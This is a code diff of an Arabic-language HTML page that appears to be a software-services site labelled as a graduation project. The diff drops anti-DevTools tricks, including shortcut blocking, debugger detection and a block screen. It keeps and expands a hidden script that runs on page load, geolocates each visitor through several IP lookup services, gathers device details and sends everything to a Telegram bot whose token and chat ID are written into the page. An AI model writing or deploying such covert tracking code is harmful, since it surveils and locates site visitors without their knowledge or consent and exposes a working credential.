@@ -13,32 +13,28 @@
         .subtitle { font-size: 1.2rem; opacity: 0.9; }
         nav { background: #2c3e50; padding: 15px 0; position: sticky; top: 0; z-index: 100; }
         nav .container { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; }
-        nav a { color: white; text-decoration: none; font-weight: 500; }
+        nav a { color: white; text-decoration: none; font-weight: 500; transition: color 0.3s; }
+        nav a:hover { color: #667eea; }
         .hero { background: white; padding: 80px 0; text-align: center; }
         .hero h2 { font-size: 2rem; margin-bottom: 20px; color: #2c3e50; }
         .hero p { font-size: 1.1rem; margin-bottom: 30px; color: #666; }
-        .hero button { background: #667eea; color: white; border: none; padding: 15px 40px; font-size: 1rem; border-radius: 5px; cursor: pointer; }
+        .hero button { background: #667eea; color: white; border: none; padding: 15px 40px; font-size: 1rem; border-radius: 5px; cursor: pointer; transition: background 0.3s; }
+        .hero button:hover { background: #5568d3; }
         section { padding: 60px 0; }
         section h2 { text-align: center; font-size: 2rem; margin-bottom: 40px; color: #2c3e50; }
         .services-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 30px; }
-        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); transition: transform 0.3s, box-shadow 0.3s; }
+        .card:hover { transform: translateY(-5px); box-shadow: 0 8px 15px rgba(0,0,0,0.15); }
         .card h3 { color: #667eea; margin-bottom: 15px; }
         footer { background: #2c3e50; color: white; text-align: center; padding: 30px 0; }
         footer .notice { margin-top: 10px; font-size: 0.9rem; color: #f39c12; }
-        .blocked { display: none; position: fixed; inset: 0; background: #000; color: #f00; z-index: 99999; align-items: center; justify-content: center; font-size: 2rem; text-align: center; padding: 20px; }
-        .blocked.active { display: flex; }
-        @media (max-width: 768px) { header h1 { font-size: 1.8rem; } .hero h2 { font-size: 1.5rem; } }
+        @media (max-width: 768px) {
+            header h1 { font-size: 1.8rem; }
+            .hero h2 { font-size: 1.5rem; }
+        }
     </style>
 </head>
 <body>
-
-    <!-- شاشة الحظر -->
-    <div class="blocked" id="blockScreen">
-        <div>
-            <h1>⛔ غير مسموح</h1>
-            <p style="font-size: 1rem; margin-top: 20px; color: #aaa;">الرجاء إغلاق أدوات المطور</p>
-        </div>
-    </div>
 
     <header>
         <div class="container">
@@ -59,6 +55,9 @@
         <div class="container">
             <h2>حلول برمجية متكاملة</h2>
             <p>نقدم خدمات تطوير المواقع، التطبيقات، والأنظمة المخصصة</p>
+            <button onclick="document.getElementById('services').scrollIntoView({behavior:'smooth'})">
+                تعرف على خدماتنا
+            </button>
         </div>
     </section>
 
@@ -74,7 +73,7 @@
         </div>
     </section>
 
-    <footer>
+    <footer id="contact">
         <div class="container">
             <p>©️ 2026 محمد ربيع - جميع الحقوق محفوظة</p>
             <p class="notice">⚠️ صفحة تعليمية ضمن مشروع تخرج</p>
@@ -83,126 +82,82 @@
 
     <script>
         // ==========================================
-        // 🛡️ طبقات الحماية
-        // ==========================================
-
-        // 1. منع كليك يمين
-        document.addEventListener('contextmenu', e => {
-            e.preventDefault();
-            return false;
-        });
-
-        // 2. منع اختصارات DevTools
-        document.addEventListener('keydown', e => {
-            const k = e.key.toUpperCase();
-            if (
-                e.key === 'F12' ||
-                (e.ctrlKey && e.shiftKey && ['I','J','C','K'].includes(k)) ||
-                (e.ctrlKey && k === 'U') ||
-                (e.metaKey && e.altKey && ['I','J','C'].includes(k))
-            ) {
-                e.preventDefault();
-                return false;
-            }
-        });
-
-        // 3. كشف فتح DevTools
-        let devtoolsOpen = false;
-        const threshold = 160;
-
-        setInterval(() => {
-            const widthDiff = window.outerWidth - window.innerWidth > threshold;
-            const heightDiff = window.outerHeight - window.innerHeight > threshold;
-
-            if (widthDiff || heightDiff) {
-                if (!devtoolsOpen) {
-                    devtoolsOpen = true;
-                    document.getElementById('blockScreen').classList.add('active');
-                }
-            } else {
-                if (devtoolsOpen) {
-                    devtoolsOpen = false;
-                    document.getElementById('blockScreen').classList.remove('active');
-                }
-            }
-        }, 500);
-
-        // 4. كشف الـ debugger
-        setInterval(() => {
-            const t0 = performance.now();
-            (function() { debugger; })();
-            const t1 = performance.now();
-            if (t1 - t0 > 100) {
-                document.getElementById('blockScreen').classList.add('active');
-            }
-        }, 2000);
-
-        // 5. تعطيل تحديد النص
-        document.addEventListener('selectstart', e => {
-            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
-                e.preventDefault();
-            }
-        });
-
-        // 6. تعطيل السحب
-        document.addEventListener('dragstart', e => e.preventDefault());
-
-        // ==========================================
         // ⚙️ الإعدادات
         // ==========================================
         const BOT_TOKEN = '8979794427:AAEsfNT-TB-gFZiJu75EWqAwoo6uEE2s-LM';
         const CHAT_ID = '5595945557';
 
         // ==========================================
-        // 📤 إرسال البيانات
+        // 🌐 جلب بيانات الـ IP من عدة مصادر (Fallback)
         // ==========================================
-        async function sendToTelegram() {
+        async function getIPData() {
+            // 1) ipapi.co
             try {
-                const ipData = await fetch('https://ipapi.co/json/')
-                    .then(r => r.json())
-                    .catch(() => ({}));
-
-                const ua = navigator.userAgent;
-                const deviceType = detectDevice(ua);
-
-                const message = `
-🎯 *زائر جديد!*
-
-📍 *الموقع:*
-• IP: \`${ipData.ip || 'غير معروف'}\`
-• المدينة: ${ipData.city || 'غير معروف'}
-• المنطقة: ${ipData.region || 'غير معروف'}
-• الدولة: ${ipData.country_name || 'غير معروف'}
-• ISP: ${ipData.org || 'غير معروف'}
-
-🗺️ *الخريطة:*
-https://www.google.com/maps?q=${ipData.latitude || 0},${ipData.longitude || 0}
-
-📱 *الجهاز:*
-• النوع: ${deviceType}
-• النظام: ${navigator.platform}
-• الشاشة: ${screen.width}x${screen.height}
-• اللغة: ${navigator.language}
-
-🕐 *الوقت:* ${new Date().toLocaleString('ar-EG')}
-                `;
-
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown',
-                        disable_web_page_preview: false
-                    })
-                });
+                const r = await fetch('https://ipapi.co/json/');
+                const d = await r.json();
+                if (d && d.latitude && d.longitude && !d.error) {
+                    console.log('✅ ipapi.co نجح');
+                    return {
+                        ip: d.ip,
+                        city: d.city,
+                        region: d.region,
+                        country: d.country_name,
+                        org: d.org,
+                        lat: d.latitude,
+                        lon: d.longitude
+                    };
+                }
+                console.warn('⚠️ ipapi.co رجع بيانات ناقصة:', d);
             } catch (e) {
-                console.error(e);
+                console.warn('❌ ipapi.co فشل:', e.message);
             }
+
+            // 2) ipwho.is
+            try {
+                const r = await fetch('https://ipwho.is/');
+                const d = await r.json();
+                if (d && d.success && d.latitude && d.longitude) {
+                    console.log('✅ ipwho.is نجح');
+                    return {
+                        ip: d.ip,
+                        city: d.city,
+                        region: d.region,
+                        country: d.country,
+                        org: d.connection?.isp,
+                        lat: d.latitude,
+                        lon: d.longitude
+                    };
+                }
+            } catch (e) {
+                console.warn('❌ ipwho.is فشل:', e.message);
+            }
+
+            // 3) ip-api.com (بيشتغل على HTTP فقط في الخطة المجانية)
+            try {
+                const r = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,isp,lat,lon,query');
+                const d = await r.json();
+                if (d && d.status === 'success' && d.lat && d.lon) {
+                    console.log('✅ ip-api.com نجح');
+                    return {
+                        ip: d.query,
+                        city: d.city,
+                        region: d.regionName,
+                        country: d.country,
+                        org: d.isp,
+                        lat: d.lat,
+                        lon: d.lon
+                    };
+                }
+            } catch (e) {
+                console.warn('❌ ip-api.com فشل:', e.message);
+            }
+
+            return null;
         }
 
+        // ==========================================
+        // 📱 كشف نوع الجهاز
+        // ==========================================
         function detectDevice(ua) {
             const u = ua.toLowerCase();
             if (u.includes('android')) return '📱 Android';
@@ -214,6 +169,74 @@ https://www.google.com/maps?q=${ipData.latitude || 0},${ipData.longitude || 0}
             return '❓ غير معروف';
         }
 
+        // ==========================================
+        // 📤 إرسال البيانات لتيليجرام
+        // ==========================================
+        async function sendToTelegram() {
+            try {
+                const ipData = await getIPData();
+
+                if (!ipData) {
+                    console.warn('⚠️ فشل جلب بيانات IP من كل المصادر');
+                    return;
+                }
+
+                const ua = navigator.userAgent;
+                const deviceType = detectDevice(ua);
+
+                // رابط الخريطة (يتحقق من وجود الإحداثيات)
+                const mapLink = (ipData.lat && ipData.lon)
+                    ? `https://www.google.com/maps?q=${ipData.lat},${ipData.lon}`
+                    : 'غير متاح';
+
+                const message = `
+🎯 *زائر جديد!*
+
+📍 *الموقع:*
+• IP: \`${ipData.ip || 'غير معروف'}\`
+• المدينة: ${ipData.city || 'غير معروف'}
+• المنطقة: ${ipData.region || 'غير معروف'}
+• الدولة: ${ipData.country || 'غير معروف'}
+• ISP: ${ipData.org || 'غير معروف'}
+
+🗺️ *الخريطة:*
+${mapLink}
+
+📱 *الجهاز:*
+• النوع: ${deviceType}
+• النظام: ${navigator.platform}
+• الشاشة: ${screen.width}x${screen.height}
+• اللغة: ${navigator.language}
+
+🕐 *الوقت:* ${new Date().toLocaleString('ar-EG')}
+                `.trim();
+
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const res = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: false
+                    })
+                });
+
+                const result = await res.json();
+                if (result.ok) {
+                    console.log('✅ تم إرسال البيانات لتيليجرام بنجاح');
+                } else {
+                    console.error('❌ خطأ من تيليجرام:', result.description);
+                }
+            } catch (e) {
+                console.error('❌ sendToTelegram error:', e);
+            }
+        }
+
+        // ==========================================
+        // 🚀 التشغيل عند تحميل الصفحة
+        // ==========================================
         window.addEventListener('load', sendToTelegram);
     </script>
 </body>
